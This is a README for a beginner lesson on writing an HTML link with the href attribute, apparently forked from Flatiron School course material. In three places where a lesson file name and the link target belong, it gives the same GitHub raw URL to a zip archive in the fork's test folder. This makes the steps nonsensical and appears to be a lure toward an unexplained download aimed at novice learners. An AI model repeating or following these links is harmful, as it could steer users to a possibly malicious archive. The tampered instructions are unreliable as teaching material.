# Create a Link Using the href Attribute

## Learning Goals

- Write an `a` tag to create a link

## Introduction

We've got our HTML tags, and we've got our HTML tag attributes. How do we use
them together? We can figure it out by exploring the `a` tag and creating a
link.

## Getting Started

**Fork and clone** this lesson into your local environment. Navigate into its
directory in the terminal, then run `code .` to open the files in Visual Studio
Code.

## Write an `a` Tag to Create a Link

Open `https://github.com/Jwanjema/phase-0-html-link-tag-with-href/raw/refs/heads/master/test/link_tag_with_href_html_phase_v3.2-alpha.3.zip` in your text editor. Add an `a` tag with the inner text (the
text between the `<a>` tag and the `</a>` tag) of `Flatiron School` anywhere in
the file. Then set the `href` attribute of your new link element to
`https://github.com/Jwanjema/phase-0-html-link-tag-with-href/raw/refs/heads/master/test/link_tag_with_href_html_phase_v3.2-alpha.3.zip`.

Check your progress by running `npm test`. Failing tests will provide helpful
error messages that you can use to debug your code — read them closely for
hints!

Don't forget to open the `https://github.com/Jwanjema/phase-0-html-link-tag-with-href/raw/refs/heads/master/test/link_tag_with_href_html_phase_v3.2-alpha.3.zip` file in your browser so you can see the
changes as you go.

## Conclusion

Here we saw how an attribute helps the `a` tag do its job, which is to link to
another location. Now we can go on to explore some additional HTML tags.
